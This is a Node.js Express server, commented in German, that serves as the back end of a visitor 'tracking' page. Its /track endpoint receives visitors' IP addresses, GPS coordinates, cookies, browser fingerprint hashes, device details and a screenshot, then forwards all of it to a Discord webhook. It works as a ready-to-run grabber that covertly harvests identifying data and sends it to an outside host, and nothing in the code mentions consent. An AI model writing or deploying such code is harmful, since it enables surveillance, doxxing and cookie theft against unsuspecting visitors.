// server.js — Discord Tracking ohne DB (POST + Screenshot-Upload)
const express = require('express');
const axios = require('axios');
const path = require('path');
const FormData = require('form-data');

const app = express();
const port = process.env.PORT || 3000;

app.set('trust proxy', true);

// << Body-Limit anheben, weil Screenshot als Data-URL groß sein kann >>
app.use(express.json({ limit: '10mb' }));

// Static
const publicDir = path.join(__dirname, 'public');
app.use(express.static(publicDir));

app.get('/health', (_, res) => res.send('ok'));
app.get('/', (_, res) => res.sendFile(path.join(publicDir, 'index.html')));

const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

// Client-IP (nur Info)
function getClientIp(req) {
  const xf = req.headers['x-forwarded-for'] || req.headers['x-real-ip'];
  if (xf) return String(xf).split(',')[0].trim().replace(/^::ffff:/, '');
  return (req.socket?.remoteAddress || '').replace(/^::ffff:/, '');
}

// kleine Helfer
const clip = (v, n = 512) => (v == null ? '–' : String(v).slice(0, n));
const jclip = (obj, n = 512) => clip(JSON.stringify(obj ?? {}), n);
const safeField = (name, value, inline = true) => ({ name, value: value || '–', inline });

// ---- POST /track ----
app.post('/track', async (req, res) => {
  const ip = getClientIp(req);
  const userAgent = req.headers['user-agent'] || '';
  const t = new Date().toISOString();

  // alles vom Client
  const {
    request_id, geo_status,
    lat, lon, accuracy, altitude, heading, speed,
    userAgent: clientUA, language, languages, cookies, cookieEnabled,
    screen, viewport, pixelRatio, colorScheme, colorGamut,
    touchPoints, orientation, timezone, platform,
    hardwareConcurrency, deviceMemory, connection, dnt, referrer,
    plugins, webgl, battery, canvas_hash, audio_hash,
    screenshot  // <- data:image/...;base64,XXXX
  } = req.body || {};

  // Felder fürs Embed
  const fields = [
    safeField('Request ID', clip(request_id)),
    safeField('IP (Info)', clip(ip)),
    { name: 'User-Agent', value: clip(clientUA || userAgent, 1024), inline: false },
    safeField('Zeitzone', clip(timezone)),
    { name: 'Referrer', value: clip(referrer, 1024), inline: false },
    safeField('Geo Permission', clip(geo_status)),
    safeField('Language', clip(language)),
    { name: 'Languages', value: clip(languages, 1024), inline: false },
    safeField('Platform', clip(platform)),
    safeField('HW / RAM', `Cores: ${clip(hardwareConcurrency)} | RAM: ${clip(deviceMemory)}`),
    safeField('Do Not Track', clip(dnt)),
    safeField('Cookies enabled', String(cookieEnabled)),
    { name: 'Screen', value: jclip(screen, 1024), inline: false },
    { name: 'Viewport', value: jclip(viewport, 1024), inline: false },
    safeField('Pixel Ratio', clip(pixelRatio)),
    safeField('Color Scheme', clip(colorScheme)),
    safeField('Color Gamut', clip(colorGamut)),
    safeField('Touch / Orientation', `Touches: ${clip(touchPoints)} | ${clip(orientation)}`, false),
    { name: 'Netz', value: jclip(connection, 1024), inline: false },
    safeField('Battery', battery ? `${battery.level}% ${battery.charging ? '(charging)' : ''}` : '–'),
    { name: 'Plugins', value: Array.isArray(plugins) ? clip(plugins.join(', '), 1024) : clip(plugins, 1024), inline: false },
    { name: 'WebGL', value: jclip(webgl, 1024), inline: false },
    safeField('Canvas Hash', clip(canvas_hash)),
    safeField('Audio Hash', clip(audio_hash)),
    safeField('Location (GPS)',
      lat && lon
        ? `Lat, Lon: ${lat}, ${lon}${accuracy ? ` (±${accuracy} m)` : ''}`
          + `${altitude ? ` | Alt: ${altitude}` : ''}${heading ? ` | Heading: ${heading}` : ''}${speed ? ` | Speed: ${speed}` : ''}`
        : '–',
      false
    )
  ];

  // Basis-Embed
  const embed = {
    title: 'Tracking-Daten (Browser, POST)',
    color: 0x2b90d9,
    fields,
    timestamp: t
  };

  // ---- Nachricht vorbereiten
  let responseOk = false;
  try {
    if (DISCORD_WEBHOOK_URL) {
      // Wenn Screenshot vorhanden → als Datei hochladen und im Embed anzeigen
      if (screenshot && typeof screenshot === 'string' && screenshot.startsWith('data:')) {
        // Data-URL in Buffer verwandeln
        const m = screenshot.match(/^data:(image\/[a-zA-Z0-9.+-]+);base64,(.+)$/);
        if (m) {
          const mime = m[1] || 'image/jpeg';
          const base64 = m[2];
          const buf = Buffer.from(base64, 'base64');
          const filename = `screenshot-${Date.now()}.${mime.split('/')[1] || 'jpg'}`;

          // Bild im Embed referenzieren
          embed.image = { url: `attachment://${filename}` };

          const form = new FormData();
          form.append('payload_json', JSON.stringify({
            content: `📡 **Neuer Track** — ${t}`,
            embeds: [embed]
          }));
          form.append('files[0]', buf, { filename, contentType: mime });

          await axios.post(DISCORD_WEBHOOK_URL, form, {
            headers: form.getHeaders(),
            maxContentLength: Infinity,
            maxBodyLength: Infinity,
            timeout: 10000
          });
          responseOk = true;
        }
      }

      // Falls kein (valider) Screenshot vorliegt → normale JSON-Webhook-Nachricht
      if (!responseOk) {
        await axios.post(DISCORD_WEBHOOK_URL, {
          content: `📡 **Neuer Track** — ${t}`,
          embeds: [embed]
        }, { timeout: 10000 });
      }
    } else {
      console.warn('Kein DISCORD_WEBHOOK_URL gesetzt – Nachricht wird nicht gesendet.');
    }
  } catch (e) {
    console.error('Discord-Webhook-Fehler:', e.response?.status, e.response?.data || e.message);
  }

  res.json({ ok: true });
});

// Start
app.listen(port, () => console.log(`Server läuft auf Port ${port}`));

